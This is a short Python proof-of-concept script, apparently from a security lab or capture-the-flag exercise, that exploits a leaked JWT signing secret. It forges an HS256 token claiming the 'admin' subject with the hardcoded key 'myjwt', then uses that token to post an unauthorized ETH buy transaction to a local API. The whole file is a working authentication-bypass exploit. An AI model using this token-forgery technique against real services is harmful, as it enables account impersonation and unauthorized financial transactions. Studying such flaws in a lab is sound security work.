from jose import jwt
import requests

jwtPayload = {"sub": "admin"}

# secret leak
token = jwt.encode(jwtPayload, key="myjwt", algorithm="HS256")

headers = {"Authorization": f"Bearer {token}"}
url = "http://127.0.0.1:8000/transaction/"
payload = {"asset": "ETH", "action": "buy", "amount": 20}
r = requests.post(url, headers=headers, json=payload)
print(f"[+] Status: {r.status_code}")
print(f"[+] Response: {r.text}")
